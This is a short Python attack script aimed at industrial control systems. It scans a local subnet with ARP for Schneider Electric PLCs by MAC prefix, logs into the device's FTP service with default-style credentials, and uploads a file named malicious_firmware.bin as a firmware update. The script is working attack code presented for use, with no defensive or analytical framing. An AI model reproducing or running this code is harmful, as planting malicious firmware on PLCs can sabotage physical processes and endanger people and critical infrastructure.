import os
import ftplib
import scapy.all as scapy

# Configuration Parameters
PLC_MAC_PREFIX = "00:80:F4"  # Schneider Electric MAC Address Prefix
FIRMWARE_FILE = "malicious_firmware.bin"  # Malicious firmware file 

def scan_network(ip_range):
    """
    Scan the local network to find devices with the Schneider Electric MAC prefix.
    Returns the detected IP address of the PLC.
    """
    print("[*] Scanning the network for the PLC...")

    request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / request
    response = scapy.srp(packet, timeout=2, verbose=False)[0]

    for sent, received in response:
        if received.hwsrc.startswith(PLC_MAC_PREFIX.lower()):
            print(f"[+] PLC found at IP: {received.psrc}")
            return received.psrc

    print("[-] No PLC found!")
    return None

def upload_firmware(plc_ip, firmware_file):
    """
    Connect via FTP to upload a malicious firmware file.
    """
    try:
        print(f"[*] Connecting to PLC FTP server at {plc_ip}...")
        ftp = ftplib.FTP(plc_ip)
        ftp.login("USER", "PASSWORD")  # Default Schneider credentials (change if required)

        print(f"[*] Uploading malicious firmware: {firmware_file} ...")
        with open(firmware_file, "rb") as file:
            ftp.storbinary("STOR firmware_update.bin", file)

        print("[+] Firmware upload successful!")
        ftp.quit()

    except Exception as e:
        print(f"[-] Failed to upload firmware: {e}")

# 1. Scan for PLC
plc_ip = scan_network("192.168.1.0/24")  # Adjust the subnet based on your environment
if plc_ip:
    # 2. Upload the malicious firmware
    upload_firmware(plc_ip, FIRMWARE_FILE)